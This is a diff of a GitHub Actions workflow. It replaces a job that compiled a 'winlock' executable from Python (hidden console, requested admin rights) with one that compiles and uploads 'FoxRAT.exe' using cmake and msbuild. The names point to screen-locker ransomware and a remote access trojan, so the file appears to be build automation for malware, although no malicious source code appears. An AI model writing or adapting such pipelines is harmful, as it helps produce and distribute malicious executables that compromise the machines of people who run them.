@@ -1,36 +1,32 @@
-name: Build Winlock EXE
+name: Build FoxRAT Combo
 
 on:
   push:
-    branches: [ main, master ]
+    branches:
+      - main
   workflow_dispatch:
 
 jobs:
   build:
-    runs-on: windows-latest
-
+    runs-on: windows-2019
     steps:
-      - name: Checkout repo
-        uses: actions/checkout@v4
+    - name: Checkout Code
+      uses: actions/checkout@v2
 
-      - name: Setup Python
-        uses: actions/setup-python@v5
-        with:
-          python-version: '3.11'
+    - name: Add msbuild to PATH
+      uses: microsoft/setup-msbuild@v1.1
 
-      - name: Install deps
-        run: |
-          python -m pip install --upgrade pip
-          pip install pyinstaller
-          if (Test-Path requirements.txt) { pip install -r requirements.txt }
+    - name: Create VS Solution Project
+      run: |
+        mkdir build
+        cd build
+        cmake -G "Visual Studio 16 2019" -A x64 ..
 
-      - name: Build EXE
-        run: |
-          pyinstaller --onefile --noconsole --uac-admin --name winlock winlock.py
+    - name: Build Release
+      run: msbuild build/FoxRAT.sln /p:Configuration=Release /p:Platform=x64
 
-      - name: Upload artifact
-        uses: actions/upload-artifact@v4
-        with:
-          name: winlock-exe
-          path: dist/winlock.exe
-          retention-days: 90
+    - name: Upload Artifact
+      uses: actions/upload-artifact@v2
+      with:
+        name: FoxRAT_Built
+        path: build/Release/FoxRAT.exe
